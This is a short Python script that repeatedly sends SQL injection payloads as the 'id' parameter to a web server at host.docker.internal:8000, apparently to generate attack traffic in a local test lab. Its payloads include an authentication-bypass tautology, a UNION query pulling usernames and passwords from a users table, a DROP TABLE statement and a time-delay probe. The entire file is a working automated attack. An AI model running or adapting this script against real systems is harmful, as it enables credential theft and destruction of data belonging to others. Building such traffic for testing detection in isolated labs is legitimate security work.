import requests
import time
import random

TARGET = "http://host.docker.internal:8000"

PAYLOADS = [
    "1' OR '1'='1--",
    "1 UNION SELECT username, password FROM users--",
    "1; DROP TABLE users--",
    "1' WAITFOR DELAY '0:0:10'--"
]

def attack():
    while True:
        try:
            payload = random.choice(PAYLOADS)
            url = f"{TARGET}/?id={payload}"
            response = requests.get(url)
            print(f"[SQLi] Payload: {payload} | Status: {response.status_code}")
        except Exception as e:
            print(f"[SQLi Error] {e}")
        time.sleep(1)

if __name__ == "__main__":
    attack()